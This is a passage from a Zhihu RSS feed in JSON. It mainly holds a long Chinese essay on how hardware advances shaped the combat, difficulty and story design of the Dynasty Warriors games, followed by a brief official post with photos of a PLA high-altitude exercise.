03:04:46","description":"\n<p>分两个方面谈，先说动作。</p>\n<p>直接抛出论点，无双系列现在要考虑的不是如何让自己进化，而是怎么合理地完成退化。近些年许多成功的游戏都在向过去的类型回归，甚至是想方设法给自己套上枷锁，因为技术虽然可以不断提升，但开发人员的精力和玩家的注意力都是有限的，设计者需要把控好其中的平衡点。无双系列之所以变成现在这个样子，很大原因是设计者失去了节制。</p>\n<p>现在的无双被称为“割草”游戏，割草和无脑甚至成为了玩家口中的卖点，而老玩家又会告诉你最初的无双其实是相当硬核的游戏，打击感很强，敌人的攻击意识和招式性能都很高，玩起来并不简单。这些都是事实，但我最近又重新观察了一下无双的旧作和新作，发现无双系列过去的优秀打击感和高对抗性实际上都是缘于巧合，它们产生于PS2初期的低性能，而游戏机性能的进步反而毁掉了这种体验。</p>\n<p>如果我们追溯到FC时代，当时由于游戏机性能不足，同屏通常只会出现4个以内的敌人，外加游戏容量有限，必须以提升难度的方式来增加游玩时长。因而这个时期的敌人攻击欲望极高，性能强度也总是超过玩家所操控的角色，往往同屏出现两个以上的敌人就能给玩家带来很大压力。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ade0234f3fd44e0bd5866ac7fdbd4a51_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ade0234f3fd44e0bd5866ac7fdbd4a51\" data-watermark-src=\"v2-52971147598a74c12c5cfedad556260f\" data-private-watermark-src=\"v2-a811f4771c17a63922ee5a4e0ceb07ba\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5c224178025baa256cb7bbe21e5423d5_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"445\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5c224178025baa256cb7bbe21e5423d5\" data-watermark-src=\"v2-c5bc835f54fef115a6de8ecd0dbeaa30\" data-private-watermark-src=\"v2-1018e665d9a770442d370fcd45a7adbc\"></p>\n<p>这一点在街机和PS1上的动作游戏里也没有太大变化，同屏基本只能支撑六个以内的计算单位，因而需要调高单个敌人的性能强度来维持难度。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-07bdc6f1f02468295b89f486c46bda55_720w.jpg?rss\" data-rawwidth=\"384\" data-rawheight=\"224\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-07bdc6f1f02468295b89f486c46bda55\" data-watermark-src=\"v2-2d5a99bf865a13b1c485c5e39a3e0ecb\" data-private-watermark-src=\"v2-4e7c05f00c9e2d7b8aaadace0eaffe9e\"></p>\n<p>但PS2上的初代真三国无双打破了这种传统，其整个战场是联通的，并没有分离区域并为同屏出现的敌人设置上限，理论上玩家可以将尽量多的敌人集中在同一地点。但事实上根本这不可能办到，因为机能达不到要求使得玩家视野只有十来步的距离，脱离开这个范围就是雾茫茫的一片，而且同屏人数一旦超过十几人就会因为运算速度跟不上而出现严重的拖慢现象，身边的敌人甚至会消失或者闪现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf016283dba544b485412c42c4fe39eb_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"319\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bf016283dba544b485412c42c4fe39eb\" data-watermark-src=\"v2-7dd1d47919e20a7ca90c330092ff4b2e\" data-private-watermark-src=\"v2-e13f7ad38b74f4c767ae0d595d4ac234\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1aa82141c448ae3ad7cd0a60d3bd2681_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1aa82141c448ae3ad7cd0a60d3bd2681\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这个问题直到2004年9月的战国无双猛将传里也没有得到完全解决，该作视野范围狭小和动作拖慢现象都比较明显，但等到2005年2月（记住这个时间点）的真三国无双4发售后，顽疾终于被克服。四代之所以能解决这些问题是因为使用了新的画面引擎，并且这时已经属于PS2后期，各大厂商都把游戏机性能吃透了，技术升级过后的354无论视野还是同屏人数都不能与353同日而语。</p>\n<p>但这样一来问题也就出现了，如果敌人保持与前作同样的强度，那么在同屏人数大幅增加后玩家要怎么应对呢？虽然老玩家们喜欢说二三代的AI高，四代的AI低，但经过一些技术大佬的解析，发现四代的AI程序要比三代要写得更加复杂且合理。例如三代的士兵出招是完全不分场合的，就是一股脑猛砍，玩家的弹返可以轻易成功，四代则分清了各种情况，当玩家招式挥空失误后敌人会积极出招。但四代的敌人攻击欲望确实要低很多，而且经过解析发现，制作组一开始写了高攻击欲望的程序，但最后并没有启用，有专门做mod的大神不辞辛苦把敌人的攻击欲望提上去后，发现游戏变成了这样：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fe1b3df5938feebb3ac538fb625fba26_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fe1b3df5938feebb3ac538fb625fba26\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如此一来，也就很好理解为何制作组没有启用已经写好的程序了。</p>\n<p>为了应对同屏人数增加带来的难题，制作组选择了两种手段，一是降低士兵AI，二是提升招式性能。早先无双武将的招式性能配合玩家的操作要和十个以内的敌方单位进行交战是勉强可以办到的，而这个数字如果继续往上提，那就不是玩家的操作可以弥补的了。如果大家去看早期无双作品的高手视频，会发现再怎么厉害的人也免不了经常挨打，和鬼泣系列的大佬们可以轻易做到无伤炫技截然不同。而这并不是因为这些玩家技不如人，纯粹是因为敌人太多再外加无双武将的招式性能跟不上。</p>\n<p>所以四代只好调低了杂兵的攻击欲望和招式性能，杂兵不再有C技，没有全套的普通攻击，无法致晕和击飞玩家，并且出招频率也大幅下降。但武将AI其实并没有降低（相对353本传），甚至略有提升，如果去玩战国无双2浅井长政的金崎之战或者初代无双大蛇战国传的五丈原之战，打出多个己方武将围殴敌将的场景时，就会发生刚才的图片里一群人砍得对手根本翻不了身的状况。</p>\n<p>然而即便如此，这种调整给整个游戏带来的体验也是颠覆性的变化。玩家面对低欲望的敌人可以轻易地杀进杀出，在战场上宛如闲庭信步，也正是从这一代起，无双有了“割草”之名。而为了在高难度下保持对玩家的震慑力，制作组简单粗暴地提升了敌人数值并断掉玩家补给，修罗难度下敌人的伤害是困难难度下的五倍，玩家练满的角色都挨不起几刀。</p>\n<p>于是出现一种很奇葩的现象是老玩家一提起四代的敌人智商和招式性能都说好菜，但提起四代的修罗难度又说真尼玛难。三代猛将传的敌人攻击欲望和战斗对抗性虽然远在四代之上，但三代猛将传的达人难度其实比四代的修罗难度要简单许多，这是因为三代的数值平衡做得比四代好，而四代之所以把数值做崩是因为敌我攻防没做好，攻防没做好又是因为制作组削弱了杂兵，削弱杂兵的原因是同屏人数增加，而追溯到最后一切的根源居然是因为游戏机性能的提升。</p>\n<p>五代制作组因为四代受到的这些批评曾试图进行挽回，又再次调高了敌人的攻击欲望。结果因为五代出在PS3上，机器性能又再一次得到升级，同屏人数比四代还多得多，加上五代的数值做得和四代一样崩，即使无双武将的招式性能已经远超四代，并且没有断掉补给，但五代的修罗难度玩起来比四代还要难。因为人太多，玩家经常连自己是怎么死掉的都不知道，只能频繁地使用“三方一滚”，打个架如同买彩票。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0e292888ce5435ca6ca5809944f1634f_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0e292888ce5435ca6ca5809944f1634f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>铃木亮浩接手六代时其实还想再挣扎一下，因而六代高难度下的杂兵其实很有威胁性，高伤害外加庞大的数量，一拥而上两管体力马上就没了，而且很难用操作技术来加以弥补。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e8077a2b434f4f9aa06f49922cb861d_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7e8077a2b434f4f9aa06f49922cb861d\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-324076d558e3b1b19bbc01fe1793dc25_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-324076d558e3b1b19bbc01fe1793dc25\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>于是铃木后来也干脆放弃了，在猛将传里加了道吸血当保险，七八代又持续降低敌人的威胁性，让游戏彻底割草化。</p>\n<p>至于提升招式性能，无双系列发轫于格斗游戏和清版过关游戏，因而系列早期作品里己方武将的出招朴实无华，初代真三里甚至没有特效招式，同时敌方角色也有不错的性能。敌人从小兵到武将都能够使用完整的连招，早期的小兵甚至会放无双和拼刀，武将还可以自行恢复体力。</p>\n<p>不过这在很大程度上还是机能不足所带来的影响。早期PS2游戏并不足以支撑各种冰火特效，例如二代许多武将的C6都是发出剑气，到三代就变成了偃月形的刀光，特效效果明显要精致许多。此外武将的出招速度也偏慢，这是3D图形处理能力不足所导致的，同时期的初代鬼泣和初代鬼武者也是这种情况。即使到了04年3月发售的怪物猎人里主角的出招都极其缓慢，而且设计者故意将招式按键设计得十分别扭，目的就是为了降低玩家的出招频率（结果歪打正着成了系列特色）。</p>\n<p>也正因为如此，游戏里出现了武将性能不足的问题。当时每一作都会给武将提升招式性能，例如二代增加了两段普通攻击、两段蓄力攻击、真无双乱舞，三代强化了C1、C3，增加JC和报名技，四代强化C5、C6、JC，增加进化攻击和无双觉醒。但因为每一代里敌兵都会变得比前一作更多，而且这几代的招式框架并没有发生改变，所以整体上保持了动态平衡，除开降低敌人攻击欲望的四代之外，玩家并没有因为招式性能的提升而感到难度明显降低。而且如果让四代维持三代的敌人攻击频率，无双武将的招式性能反而会明显跟不上，尤其貂蝉张角等角色在高难度下几乎无法生存。</p>\n<p>而问题就出在这里，四代已经完全克服了先前几代的技术难题，无论招式特效还是攻击速度都可以轻易提上去，到后来的初代无双大蛇里制作组炫技般地令武器可以产生满屏特效再外加抽风般的攻击速度。于是四代经过强化后的C5全部是效果技，而且破天荒地引入了武器重量设计，可以靠轻武器提升出招速度，此后无双系列每一作里都有提升出招速度的属性，而潘多拉魔盒也就此打开。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-82377a3cade4aa0520842ae79d324e39_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-82377a3cade4aa0520842ae79d324e39\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>过强的招式性能破坏了攻防之间的平衡，四代开始几乎每个角色都有大范围效果技，并将其作为击杀敌人的法宝。于是无双系列的战斗就成了想方设法撑过平庸的普通技，尽力使出效果技之后轻松灭杀大片敌人，整个过程千篇一律。而过快的攻击速度使得设计者只好缩短敌人的受创硬直，配合混乱的特效，招式立回也难以呈现，因而打击感大打折扣。</p>\n<p>这几代的武将个个都有大范围攻击，有远程招式，能够用轻功取消出招，无双乱舞威力大增，还能觉醒放宝，敌人等同于待宰的羔羊。但这又是没有办法的办法，因为现在的无双系列想在一张屏幕里放下一百个角色都不是什么难事，一个无双扔下去就能轻松打出从前一整场战斗才能完成的击杀数。以一敌十尚能谈谈攻防平衡问题，以一敌百要如何谈呢？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1e0e1463f03044cbfeee531c3c4aefd_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1e0e1463f03044cbfeee531c3c4aefd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>实际上也有人通过修改程序，尝试让敌人恢复前几代的攻击欲望，和修改四代程序后大不相同的是，因为现在的武将性能和武器属性过于强大，即使敌人保持当年的攻击频率，玩家还是可以通过自身强大到近乎无赖的招式轻松过关。</p>\n<p>如果我们把视野放得更宽，会发现机能的无限升级在某种程度上已经摧毁了整个传统动作游戏。差不多是在光荣吃透PS2机能的同一时间，2005年3月卡普空推出了鬼泣3，而性能是PS2两倍的Xbox则早先一步在2004年3月推出了忍者龙剑传。这些游戏的诞生有一个共同前提，那就是游戏机3D图像处理性能的提升，这使得开发者可以轻易地实现自己在动作方面的设想。</p>\n<p>这两个游戏有一些共同特点，例如激烈的攻防、流畅的出招、华丽的变招等到，这类游戏在2009年10月发售的猎天使魔女当中几乎达到集大成的水平，但也很快走到了末路。无限华丽的出招变招已经超出多数玩家所能承受的极限，而想要求快是没有止境的，FPS类游戏的职业玩家需要屏幕达到两百多帧才不容易出现失误，机能有多高就把游戏做多快只能通向死路。于是这些游戏很快就不吃香了，销量也跟着下跌。到后来同样是白金工作室做的尼尔：机械纪元里，已经没人强调游戏的动作系统做得有多出色了（虽然确实很出色），但它却比白金工作室出的其他任何一款游戏都卖得好。</p>\n<p>以魂类游戏为首，现在的动作游戏反而主张让游戏节奏慢下来，弱化游戏攻防，强化成长系统，用体力条限制玩家的行动，并取消不同难度的设定，让玩家通过熟悉机制和抓住弱点来战胜敌人。从前的动作游戏里所流行的高速激烈攻防遭遇版本更替，让位给了拥有最大公约数的新模式。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1b091b3372896c8d4d6723902d77047b_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1b091b3372896c8d4d6723902d77047b\" data-watermark-src=\"v2-215f6d8e012b5bc1d1de3cd03d35fe18\" data-private-watermark-src=\"v2-9b0f40ff29dfc36eb8d7a63e6f99b1f3\"></p>\n<p>曾有动画爱好者开玩笑说EVA之所以成为神作是因为钱没给够，要是钱给够了，庵野秀明做出来的就是新剧场版了。这句话可以同样套用在传统动作游戏上面，传统动作游戏当年之所以流行也是因为机能不够，要是机能够了，玩家也就玩不下去了。</p>\n<p>回到无双身上，虽然无双系列从诞生起喊出的口号就是“一骑当千”，然而最初的无双顶多是“一骑当十”，但这正是无双游戏好玩的根源。当初的无双拥有优秀的打击感和严谨的招式判定，制作组之所以会做出这样的好游戏恰恰是因为机能不够，这是一个美丽的巧合，因为制作组真正想做的是“一骑当千”的游戏，也就是现在的无双所呈现出的样子。而等到真正可以做出这样的游戏后，大家才发现，“一骑当千”并不好玩。</p>\n<p>要问怎么改的话，如果是两年前的我，肯定会不假思索地说减少同屏人数，降低招式性能，恢复到三代的合理水平。即使现在我也觉得这个想法没有问题，战国无双猛将传的同屏人数和招式性能就是我心中无双类游戏最合适的范围。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c2c2f01cb5f62b6e7761407d63bd02de_720w.jpg?rss\" data-rawwidth=\"564\" data-rawheight=\"422\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c2c2f01cb5f62b6e7761407d63bd02de\" data-watermark-src=\"v2-92c26c5e7f549fd2f7540b623b9de260\" data-private-watermark-src=\"v2-49f649c7e5fd1806c414db81b5ecc962\"></p>\n<p>问题是很多时候即使知道了正确的方向也无法找到正确的路线。类如强行把鬼泣和忍龙里招式性能降下来，加入其它机制，多半会让游戏死得更快，要做这样的改动不如另起炉灶直接搞一个新系列。而且无双系列这种特殊的过关游戏如果不在进行模式上做出重大调整，同屏人数不会有任何变化，那要怎么一边体现出战场感一边控制敌人数量呢？这个问题可能远比想象中要复杂。</p>\n<p>同时，无双大蛇3的销量又显示出这种无脑割草的风格依旧很有市场。同时这些年在玩家中也深受好评的几部无双（如战国BASARA3、P5S）也并没有在敌人AI上显示出多么高的水平，因此没必要直接把路堵死，像战国BASARA3和P5S的打击感甚至还不如无双。</p>\n<p>如果学习这几部作品就应该革新动作系统，无双系列的动作设计确实过于简单无聊，而且缺乏个性。比如八代的关兴和钟会都使用刀扇，这两人有什么共同特点，为什么要用同样的招式？就算使用独立模组的武将也很少有体现自身个性的出招方式，例如蔡文姬的箜篌就是简单地释放音波攻击，没有更多体现出箜篌特点的攻击，实际操作体验和普通武器并没有什么区别。</p>\n<p>但如果要在这方面进行革新，那么新的问题又产生了，战国BASARA在三代经历了脱胎换骨的变化之后，四代的进化方向也陷入了迷茫，和之前提到的鬼泣有了同样的烦恼，那就是系统设计过于复杂，许多角色操控起来的繁杂感已经超过爽快感。而在三代当中已经设计得十分优秀的角色招式又必须进行性能调整，其中不乏越调越差的。此外，现在的真三系列已经多达94名角色，谁有本事给这么多人全部设计出个性攻击来？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d4dcf3a47e476787911f69bdf2872f5_720w.jpg?rss\" data-rawwidth=\"657\" data-rawheight=\"605\" data-size=\"normal\" data-caption=\"香蕉系列才四十多个人就陷入了发展瓶颈\" data-watermark=\"original\" data-original-src=\"v2-4d4dcf3a47e476787911f69bdf2872f5\" data-watermark-src=\"v2-f4d2871d922f867724f0ab7ba1cde9b8\" data-private-watermark-src=\"v2-85673c083fcf5d282641643cda77b88b\"></p>\n<p>与其说无双系列目前的动作系统缺少研究价值，不如说这样的系统正好适合无双。我们假设把每个角色都做出研究价值来，那么从上手到熟练，三个小时以上是必须的吧，三乘以九十四等于多少？四乘以九十四呢？</p>\n<p>而且就算精心打磨把游戏做得尽善尽美，下一作要如何在继承优点的基础上继续进化又是个难解决的问题。无双这种系统设计再外加系列化的做法，像是为自己定下一条死路。之所以只剩光荣一家还在做这种游戏，是因为只有他们肯一条路走到黑，其他公司早就发现这条路走不通了。</p>\n<p>第二个方面则是剧情和游戏模式。</p>\n<p>我写过很多评价无双系列剧情的文章，这里不想多说将来真三系列的剧本应该怎么写这种细节问题，就说时长。352的剧情CG仅有12分钟，过场事件也不多，353的剧情CG有18分钟，到354就猛增到五十多分钟，而且过场事件也大幅增加。355的全部剧情动画采用同一规格制作，约有194分钟，六代加猛将传仅高质量CG就有71分钟，配合剧情事件接近四个小时。七代CG虽少，但全部剧情动画有约六个小时，到八代干脆除开五个小时的剧情动画外，其余剧情衔接全部做成站桩对话，连夷陵之战都没有专门的动画。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-64b38ce2727fed88497d6ea6c655ecf6_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"418\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64b38ce2727fed88497d6ea6c655ecf6\" data-watermark-src=\"v2-cf89ba2e1a8df6598dc5138c6fe1b922\" data-private-watermark-src=\"v2-65e289a9659f0257798de3e8c4dddce9\"></p>\n<p>八代共有177段动画，除了1段开场动画和66段剧情动画，还包括94段结局动画和16段if剧情动画。也就是说，光是看游戏里的94个角色的结局动画就要用去三个小时。与之类似的是，战国无双4的剧情动画加站桩对话共有五个小时，真田丸有六个小时，战国无双5则是八个小时。前两天还有人表示无双系列现在的剧情动画越做越敷衍，只会搞站桩对话，反不如从前的CG质量高，那没办法，文本量卷成这个样子，还要全部用CG展现出来，成本有点高过头了。</p>\n<p>我的看法是，剧情不要再求精求全，搞无限进化升级，与其在已经竭泽而渔的故事模式上面继续卷下去，不如把重心放在其他模式上。故事模式是有极限的，无论做得再好，玩家也不会打通一遍又一遍，在上面反复花时间，与之相反，玩家的多数时间都花在副模式上面。无双系列的副模式一向做得很差，基本只能用大量的资源奖励吸引玩家来玩，属于是把刷刷刷写在脸上。</p>\n<p>可以看出铃木在做六代时是很想把副模式做好的。本传的编年史模式安插了大量关卡，内容各异，还安排了许多个人传记和假想趣味事件进去，有意在补充故事模式里缺失的部分。结果因为包含的想法太多内容难以实现，导致这个模式中的关卡十分敷衍，一些传记关卡两分钟就能过关，多数关卡毫无设计感，既没有剧情编排也没有流程内容，单纯就是一通乱砍。最后编年史模式成了一个食之无味弃之可惜的鸡肋模式，看上去内容很多但玩起来完全没感觉。于是猛将传新增的传奇模式干脆全部用剧情关卡来填补，效果反而好得多。</p>\n<p>我自己并不会设计游戏，要提建议的话不妨试试直接模仿BASARA系列里的天下统一模式，个人觉得这个模式要比光荣自己做的帝国系列要强得多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-35b2383cad33892dd8247e4e3c1a748c_720w.jpg?rss\" data-rawwidth=\"747\" data-rawheight=\"420\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35b2383cad33892dd8247e4e3c1a748c\" data-watermark-src=\"v2-0909a1bdfdd453c60d2d657998e5734a\" data-private-watermark-src=\"v2-11dda98bbeaf434a6dca10717190657c\"></p>\n<p>相比帝国系列执着于在动作游戏中增加战略要素，又拿不出像样的资源将两者进行融合，倒还不如在保留帝国基础框架的前提下，把游戏内容全盘倒向动作。这个模式相比于故事模式可以不那么严肃，不同时空不同势力的人相遇也不会觉得突兀，光荣甚至可以照搬自己在三国志系列里用过的英雄集结、英雄乱舞、姓氏霸乱等剧本设计。</p>\n<p>与帝国不同的是，同其他势力的交战关卡不由所在地区而是由交战势力来决定。比方说只要选择和吕布势力交战就会进入虎牢关战场，然后出现吕布开无双的剧情，但如果特定角色和吕布势力交战会进入不一样的关卡，例如董卓势力和吕布势力交战会变成长安之战等。这样一来可以避免以往副模式当中关卡无聊的问题，同时能够将故事模式中不好融入的内容添加进副模式当中，例如if剧情和恶搞台词，甚至可以做出更加丰富多样的变化，例如设计乱入势力、收集特定武将组合解锁事件、进入隐藏路线等等。</p>\n<p>无双系列现在最严重的一个问题就是武将数量太多，这从很多方面影响到了无双系列在动作和剧情方面的内容设计。但如果实在没有办法解决这个问题（老玩家不肯接受删角色），那我们不妨试着把缺点变成优点，例如在三国志这种SLG里就不用担心人太多，人越多游戏效果反而越好。并且在副模式融入SLG成分后可以加入武将集体养成等内容，一场战役里培养多个武将，节约游戏时间，提升其存在价值。</p>\n<p>此外，不少玩家认为八代选择开放世界本身没有错，是光荣把游戏做砸了，希望下一代继续保持。我还是坚持游戏应该往小了做的看法，如果制作组还想继续做动作游戏，想增强战场代入感，那我认为不但不应该做包含整个大陆的开放世界地图，甚至可以考虑不再做出完整的关卡。</p>\n<p>无双系列一直以来习惯让玩家击杀战场上的所有武将，到八代变成了在大地图上隔着老远到处跑任务，什么草船借箭、苦肉计、反间计、火烧赤壁全是玩家干的，实际上却一点都没有参与感。那么可以考虑不再让玩家参与整个完整的战役而是只能参与其中的一部分，转换关卡设计思路，这样也许反倒可以表现战场的庞大格局。</p>\n<p>同时这种新设计可以配合系统来加以完成，帮助游戏焕发生机。无论是策略系统的引入还是分支剧情的派生，甚至是改变整个动作系统，都可以配合着新的关卡设计来进行。</p>\n<p>当然我只是随便一提，多半不会真的有用。无双系列发展到现在已经有二十多年历史，长期以来的积累使得这个系列本身已经不再适合进行大规模地改动。它之所以被这样多的人诟病是由于设计者的不加节制，但设计者的初衷便不是为了要节制。未来游戏界可能会发生更多类似的情况，系列化的作品要么拉长制作周期，要么另启IP。想要干出在旧IP上大动干戈这种费力不讨好的事情的，大约也就只有粉丝了，但最反对这种事的偏偏也是粉丝。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhang-ting-61-50?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">FFF团长</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/358836472/answer/2083788287?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">57 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/435774977?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">光荣的《真三国无双》系列未来还能在哪些方面进行创新？</a><br><a href=\"http://www.zhihu.com/question/36812843?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果你是《真三国无双8》里面的设计团队，你会设计一些什么样的新武器呢？</a><br>\n","link":"http://www.zhihu.com/question/358836472/answer/2083788287?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"解放军在海拔4500米的雪域高原作战演习画面曝光，令人震撼，你有什么想说的？","date":"2021-08-26 09:46:50","description":"\n<p>近日，西藏军区组织所属10多个旅团，在海拔4500米的雪域高原，围绕高原山地联合立体攻防作战，开展“雪域使命-2021”多兵种全时、全域、全要素跨昼夜实兵实弹演习。</p>\n<p>官兵们通过联合侦察、火力打击、立体拔点、清剿稳局等实战行动迅速夺占预定任务地域，歼灭蓝军武装。</p>\n<p>此次大演习，全面探索了各作战单元、各型作战火器的作战效能，不断提高部队在高海拔地域联合作战、精准打击、高效毁伤、综合保障等综合实战能力。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2ffff1af3253719ed5943e29e949db73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2ffff1af3253719ed5943e29e949db73\" data-watermark-src=\"v2-c9ae0b3348302367cdfa2813e50f94f8\" data-private-watermark-src=\"v2-29fbf0ef98a45658f106e7afa1cff44b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9ee20b4f522238daa45ff7a3457609db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-9ee20b4f522238daa45ff7a3457609db\" data-watermark-src=\"v2-f203b0e54fc9b95cd5efd17149e438b3\" data-private-watermark-src=\"v2-b36203e87e66a957e00a69373471f2d6\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b1052505a15f7ceadb03e38692bdce5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-0b1052505a15f7ceadb03e38692bdce5\" data-watermark-src=\"v2-14146e33046f232f1f7b569c51c09e30\" data-private-watermark-src=\"v2-42ec6a4d58087c8b86741fa2426fdb64\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a7d63fb071bdd546d8bf91d75406c07_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-5a7d63fb071bdd546d8bf91d75406c07\" data-watermark-src=\"v2-b6b6c2506490d6bb7a8a459f81706a1f\" data-private-watermark-src=\"v2-ec02f3b8c4b0807b9191cc88c4656e58\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d5a242bc87ece3fa6244c1fcb241cd6b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-d5a242bc87ece3fa6244c1fcb241cd6b\" data-watermark-src=\"v2-875bb58771f8f6cec6473eaf74be1cff\" data-private-watermark-src=\"v2-3d4fefea1291dfd3ec6185242bc45929\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-08f16593fd96df25d876781c6e63a691_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-08f16593fd96df25d876781c6e63a691\" data-watermark-src=\"v2-555933e32a90c43292322e3ce5e4f827\" data-private-watermark-src=\"v2-24e293356fe582d4bbee82da225f49df\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b507aadc493657e638ab1cc1939d9182_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-b507aadc493657e638ab1cc1939d9182\" data-watermark-src=\"v2-b2b67d45cbae117ebb67b26a70fec113\" data-private-watermark-src=\"v2-140c46ab7378cc1da451e2f58a4c7698\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482620344/answer/2085178976?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">461 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/482076313?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">解放军将在中国三大海域执行军事任务，释放了哪些信号？</a><br><a href=\"http://www.zhihu.com/question/404532872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">解放军几万人的穿插战术是怎么做到的 ？</a><br>\n","link":"http://www.zhihu.com/question/482620344/answer/2085178976?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《喜羊羊与灰太狼》官方放出的拟人图？是什么水平？","date":"2021-08-26 07:20:17","description":"\n<p>    